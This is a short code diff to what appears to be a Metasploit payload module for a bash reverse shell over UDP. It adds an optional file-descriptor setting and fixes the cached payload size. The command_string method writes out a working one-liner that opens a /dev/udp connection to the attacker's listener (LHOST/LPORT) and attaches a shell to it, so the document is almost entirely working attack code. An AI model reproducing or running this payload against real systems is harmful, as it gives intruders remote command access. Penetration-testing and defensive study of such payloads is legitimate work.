@@ -4,7 +4,7 @@
 ##
 
 module MetasploitModule
-  CachedSize = :dynamic
+  CachedSize = 89
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
@@ -40,6 +40,7 @@ module MetasploitModule
     )
     register_advanced_options(
       [
+        OptInt.new('FD', [false, 'The file descriptor to use for bash redirection']),
         OptString.new('BashPath', [true, 'The path to the Bash executable', 'bash']),
         OptString.new('ShellPath', [true, 'The path to the shell to execute', 'sh'])
       ]
@@ -58,7 +59,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    fd = rand(20..219)
+    fd = datastore['FD'] || rand(20..219)
     return "#{datastore['BashPath']} -c '0<&#{fd}-;exec #{fd}<>/dev/udp/#{datastore['LHOST']}/#{datastore['LPORT']};echo>&#{fd};#{datastore['ShellPath']} <&#{fd} >&#{fd} 2>&#{fd}'"
 
     # no semicolons
